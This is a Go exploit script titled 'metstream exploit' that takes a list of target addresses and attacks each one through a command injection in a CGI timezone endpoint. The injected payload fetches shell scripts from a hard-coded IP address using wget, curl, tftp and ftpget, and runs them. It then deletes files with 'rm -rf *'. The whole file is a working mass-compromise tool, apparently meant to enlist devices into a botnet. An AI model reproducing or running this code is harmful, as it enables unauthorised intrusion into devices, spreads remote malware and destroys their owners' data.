/*
metstream exploit 
2025-08-06
https://discord.gg/Y7rdB36U
@lalalala0244_19707
*/
package main

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"os"
	"sync"
)

var payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.191.63.174/ohshit.sh; curl -O http://103.191.63.174/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.191.63.174 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.191.63.174; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.191.63.174 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
" //lol

func exploit(target string, wg *sync.WaitGroup) {
	defer wg.Done()
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.Write([]byte(fmt.Sprintf("POST /cgi-bin/CGI_SetTimezone.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: echoservice\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\nContent-Length: %d\r\n\r\nzone=Europe/Stockholm|%s||a #'", target, len("zone=Europe/Stockholm|"+payload+"||a #'"), payload)))

	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)

	if strings.Contains(string(buf[:n]), "200") {
		fmt.Printf("[+] exploited (%s)\n\r", target)
	}
}

func main() {
	var wg sync.WaitGroup
	scan := bufio.NewScanner(os.Stdin)
	for scan.Scan() {
		wg.Add(1)
		go exploit(scan.Text(), &wg)
	}
	wg.Wait()
}
